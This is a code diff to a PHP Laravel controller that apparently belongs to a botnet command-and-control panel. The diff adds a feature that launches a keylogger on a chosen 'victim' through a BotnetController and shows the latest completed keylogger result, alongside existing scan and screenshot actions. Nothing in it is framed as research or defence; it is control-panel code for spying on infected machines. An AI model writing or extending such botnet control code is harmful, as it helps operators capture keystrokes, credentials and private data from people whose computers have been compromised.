@@ -79,13 +79,19 @@ class NetworkController extends Controller
                             ->latest('created_at')
                             ->first();
 
+        $keylogger = VictimAttacks::where('type', 'keylogger')
+                            ->where('state', 'done')
+                            ->latest('created_at')
+                            ->first();
+
     
         return view('network.show', [
             'group' => $group, 
             'username' => $username, 
             'name' => $name, 
             'victims' => $victims,
-            'scan' => $scan
+            'scan' => $scan,
+            'keylogger' => $keylogger
         ]);
     }
 
@@ -174,6 +180,17 @@ class NetworkController extends Controller
         }
 
         return redirect("/network/$group_id")->with('output', "Scan lancé sur l'adresse $ip.");
+    }
+
+    public function keylogger(Request $request)
+    {
+        $group_id = $request->group_id;
+        $victim_uid = $request->victim_uid;
+        $time = $request->time;
+
+        $keylogger = (new BotnetController)->keylogger($victim_uid, $time);
+
+        return redirect("/network/$group_id")->with('output', "Keylogger lancé sur la victime.");
     }
 
     public function screenshot(Request $request)
